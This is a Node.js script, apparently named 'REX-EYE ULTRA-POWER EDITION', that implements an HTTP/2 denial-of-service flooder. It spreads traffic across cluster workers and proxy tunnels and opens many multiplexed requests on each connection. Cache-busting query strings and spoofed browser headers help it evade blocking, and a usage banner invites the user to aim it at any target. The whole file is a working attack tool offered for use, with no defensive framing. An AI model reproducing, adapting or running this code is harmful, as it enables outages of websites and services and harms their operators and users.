const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5){
    console.log(`
    🚀 REX-EYE ULTRA-POWER EDITION
    Usage: node raw.js <url> <time> <rate> <threads> [--noproxy]
    Example: node raw.js https://target.com 120 100 16
    `); 
    process.exit();
}

const useProxy = process.argv[6] !== "--noproxy";
const ciphers = [
    "TLS_AES_256_GCM_SHA384", "TLS_AES_128_GCM_SHA256", "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-RSA-AES128-GCM-SHA256"
].join(":");

const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    honorCipherOrder: true,
    minVersion: "TLSv1.2",
    maxVersion: "TLSv1.3"
});

var proxies = [];
if (useProxy) {
    try {
        proxies = fs.readFileSync("proxy.txt", "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
        console.log(`[VOID] ${proxies.length} Global Proxies Loaded.`);
    } catch(e) {
        console.log(`[FATAL] proxy.txt MISSING!`);
        process.exit();
    }
}

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
];

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    rate: ~~process.argv[4], // Ini jumlah stream per koneksi
    threads: ~~process.argv[5]
};

const parsedTarget = url.parse(args.target);
let stats = { total: 0, success: 0, blocked: 0, error: 0, active: 0 };

if (cluster.isMaster) {
    console.log(`🔥 REX-EYE OVERCLOCK ACTIVE | BYPASSING GEO-IP`);
    for (let i = 0; i < args.threads; i++) cluster.fork();
    setTimeout(() => { console.log(`\n✅ ATTACK FINISHED`); process.exit(1); }, args.time * 1000);
} else {
    // Engine MULTIPLIER per Thread
    for (let j = 0; j < 5; j++) {
        setInterval(() => {
            if (stats.active < 1500) runFlooder();
        }, 1);
    }
}

function randomString(l) { return crypto.randomBytes(l).toString('hex').slice(0, l); }

function runFlooder() {
    stats.active++;
    const proxyAddr = useProxy ? proxies[Math.floor(Math.random() * proxies.length)] : null;
    
    const makeRequest = (connection) => {
        const tlsConn = tls.connect(443, parsedTarget.host, {
            socket: connection,
            ALPNProtocols: ["h2"],
            servername: parsedTarget.host,
            secureContext: secureContext,
            rejectUnauthorized: false
        }, () => {
            const client = http2.connect(parsedTarget.href, {
                createConnection: () => tlsConn,
                settings: { 
                    enablePush: false, 
                    initialWindowSize: 1073741823,
                    maxConcurrentStreams: 1000 
                }
            });

            // MULTIPLEXING: Satu koneksi hajar banyak request sekaligus
            for (let i = 0; i < args.rate; i++) {
                const req = client.request({
                    [":method"]: "GET",
                    [":path"]: parsedTarget.path + "?" + randomString(10) + "=" + randomString(8),
                    [":scheme"]: "https",
                    [":authority"]: parsedTarget.host,
                    "user-agent": userAgents[Math.floor(Math.random() * userAgents.length)],
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "accept-language": "en-US,en;q=0.9", // Fix Geo-detection
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "sec-ch-ua": '"Chromium";v="122", "Google Chrome";v="122"',
                    "sec-ch-ua-platform": '"Windows"',
                    "referer": "https://www.google.com/",
                    "cache-control": "no-cache"
                });

                req.setPriority({ weight: 256, exclusive: true });
                
                req.on("response", (res) => {
                    stats.total++;
                    if (res[":status"] === 200) stats.success++;
                    else stats.blocked++;
                    req.close();
                    req.destroy();
                });

                req.on("error", () => { stats.error++; req.destroy(); });
                req.end();
            }

            // Persistence
            setTimeout(() => { client.destroy(); tlsConn.destroy(); stats.active--; }, 8000);
        });

        tlsConn.on("error", () => { tlsConn.destroy(); stats.active--; });
    };

    if (useProxy) {
        const [host, port] = proxyAddr.split(":");
        const proxySocket = net.connect(~~port, host);
        proxySocket.setKeepAlive(true, 60000);
        proxySocket.once("connect", () => {
            proxySocket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}\r\n\r\n`);
        });
        proxySocket.on("data", (chunk) => {
            if (chunk.toString().includes("200")) makeRequest(proxySocket);
            else proxySocket.destroy();
        });
        proxySocket.on("error", () => { proxySocket.destroy(); stats.active--; });
    } else {
        makeRequest(null);
    }
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});